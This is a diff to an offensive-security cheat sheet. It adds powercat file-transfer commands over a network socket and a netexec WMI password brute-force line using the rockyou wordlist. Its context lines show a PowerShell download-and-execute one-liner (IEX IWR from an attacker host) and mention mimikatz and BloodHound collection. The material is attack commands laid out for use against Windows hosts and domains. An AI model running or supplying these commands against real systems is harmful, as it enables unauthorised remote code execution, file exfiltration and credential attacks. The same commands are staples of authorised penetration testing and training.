@@ -535,6 +535,19 @@ IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
+##### FTPModule.ps1
+
+```c
+
+```
+
+##### PowerCat
+
+```c
+powercat -c <IP> -p <PORT> -d -i <FILE>
+powercat -l -p <PORT> -d -i <FILE>
+```
+
 ##### Bash only
 
 ###### wget version
@@ -2601,6 +2614,7 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 ```c
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
 netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+netexec wmi <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
 
 #### pypykatz
